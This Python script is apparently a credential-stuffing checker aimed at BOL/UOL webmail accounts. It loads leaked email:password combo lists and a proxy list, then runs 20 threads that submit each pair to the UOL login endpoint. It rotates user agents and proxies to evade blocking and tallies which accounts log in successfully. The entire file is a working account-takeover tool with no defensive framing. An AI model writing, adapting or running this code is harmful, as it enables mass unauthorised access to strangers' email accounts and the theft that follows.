# -*- coding: utf-8 -*-


import requests
import random
import time
import threading


MAX_THREADS = 20
threads = []
queue = []
count_checkeds = 0
count_lives = 0
count_dies = 0
count_errors = 0

LOGIN_REQUEST_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://email.bol.uol.com.br",
    "referer": "https://email.bol.uol.com.br/login",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-site",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
}

USER_AGENT_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
]


def load():
    global queue, proxies
    try:
        queue = open('combo.txt', 'r').readlines()
        proxies = open('proxies.txt', 'r').readlines()
    except:
        return exit("[x] Can't read 'combo.txt'")

    if len(proxies) < 5:
        exit("[x] you need at least 5 proxies in the 'proxies.txt' file")
    if len(queue) <= 0:
        exit("[x] 'combo.txt' file is empty.")
    pass


def parse_error(body, email, password):
    global proxies
    try:
        x = str(body).split('<!-- ')[1]
        errorMessage = x.split(' -->')[0]
        return "API RESPONSE: "+errorMessage
    except:
        newProxy = random.choice(proxies)
        login(email, password, newProxy)  # retry
        return "Unknow error."


def login(email, password, proxy):
    global count_checkeds, count_dies, count_lives, count_errors, proxies
    if not email.endswith('bol.com.br'):
        return print("[x] %s %s -> Email provider not supported." % (email, password))

    loginRequestProxy = {
        'http':  'http://'+proxy,
        'https':  'https://'+proxy
    }
    # clear strings
    email = email.replace(' ', '').replace('\r', '').replace(
        '\n', '')
    formatedEmail = email.replace('@bol.com.br', '')
    password = password.replace(' ', '').replace('\r', '').replace('\n', '')

    userAgent = random.choice(USER_AGENT_LIST)

    try:
        loginPageReq = requests.get(
            'https://email.bol.uol.com.br/login', proxies=loginRequestProxy, headers={'user-agent': userAgent})
        loginPageCookies = loginPageReq.cookies.get_dict()

        loginPayload = "skin=bol-default&dest=WEBMAIL&deviceId=&user=%s&pass=%s" % (
            formatedEmail, password)
        loginRequest = requests.post(
            'https://visitante.acesso.uol.com.br/login.html', proxies=loginRequestProxy, data=loginPayload, headers=LOGIN_REQUEST_HEADERS, cookies=loginPageCookies)
    except:
        print("[!] %s %s -> Request error. Retrying..." % (email, password))
        count_errors = count_errors + 1
        count_checkeds = count_checkeds + 1
        return login(email, password, random.choice(proxies))

    count_checkeds = count_checkeds + 1

    if 'openApp(dna.uid);' in loginRequest.text:
        print("[-] %s %s -> Logged in successfully.")
        count_lives = count_lives+1
        pass
    elif 'throwErrorStatus(' in loginRequest.text:
        print("[!] %s %s -> %s" % (email, password,
                                   parse_error(loginRequest.text, email, password)))
        count_dies = count_dies+1
        pass
    else:
        print("[!] %s %s -> Request error." % (email, password))
        count_errors = count_errors + 1
    pass


def worker():
    global queue, proxies
    try:
        while len(queue) > 0:
            proxy = random.choice(proxies)
            lastAccOfQueue = str(queue.pop()).split(
                ":")  # get last acc and remove it
            userEmail = lastAccOfQueue[0]
            userPassword = lastAccOfQueue[1]
            login(userEmail, userPassword, proxy)
            time.sleep(1.0)
            pass
    except KeyboardInterrupt:
        abort()
    pass


def spawn_threads():
    while len(threads) < MAX_THREADS:
        t = threading.Thread(target=worker)
        t.daemon = True
        threads.append(t)
        pass
    pass


def start():
    for thread in threads:
        thread.start()
        pass


def abort():
    for thread in threads:
        thread.join()
        pass


def main():
    global queue
    load()
    spawn_threads()
    start()

    while len(queue) > 0:
        time.sleep(1)
        pass


main()
